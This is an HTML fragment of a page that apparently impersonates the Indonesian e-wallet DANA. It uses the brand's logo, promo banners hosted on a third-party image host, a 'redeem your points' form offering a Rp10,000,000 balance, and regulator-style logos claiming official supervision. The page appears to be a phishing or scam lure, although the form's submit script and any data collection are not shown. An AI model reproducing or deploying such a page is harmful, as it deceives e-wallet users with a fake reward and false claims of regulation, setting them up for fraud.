<body>
    <h1>
        <img src="https://hosting.tigerengine.id/ulqfeu.png" alt="DANA Logo">
    </h1>
    <div class="container">
        <div class="slider">
            <div><img src="https://hosting.tigerengine.id/nq3zwi.png" alt="Promo 1"></div>
            <div><img src="https://hosting.tigerengine.id/kiduv9.png" alt="Promo 2"></div>
            <div><img src="https://hosting.tigerengine.id/f452ma.png" alt="Promo 3"></div>

            <div><img src="https://hosting.tigerengine.id/inx5ba.png" alt="Promo 5"></div>
        </div>
        <form id="patok" onsubmit="pilat(event)">
            <div class="panel panel-info" style="outline: 2px double #0086e0; border-radius: 13px;">
                <div class="panel-body">
                    <h2 style="text-align: center; font-size: 20px; border-bottom: 1px solid #0086e0; color: #0086e0;">
                        TUKARKAN POINT ANDA DI BAWAH
                    </h2>
                    <div>
                        <input type="radio" id="baru" name="tarif" value="Voucher Belanja Rp.300.000" required>
                        <label for="baru">Voucher Belanja Rp.300.000</label>
                    </div>
                    <div>
                        <input type="radio" id="lama" name="tarif" value="Saldo Dana Rp10.000.000" required>
                        <label for="lama">Saldo Dana Rp10.000.000</label>
                    </div>
                </div>
            </div>
        </form>
        <!-- Loading Spinner -->
        <div class="process" id="process1">

            </div>
        </div>
    </div>
    <footer>
        <button type="submit" form="patok" class="btn-punya">Konfirmasi</button>
        <h6>Dana Terdaftar dan diawasi oleh:</h6>
        <img src="https://hosting.tigerengine.id/sxbut9.png" width="70">
        <img src="https://hosting.tigerengine.id/45b4wg.png" width="70">
        <img src="https://hosting.tigerengine.id/vfejf1.jpg" width="70">
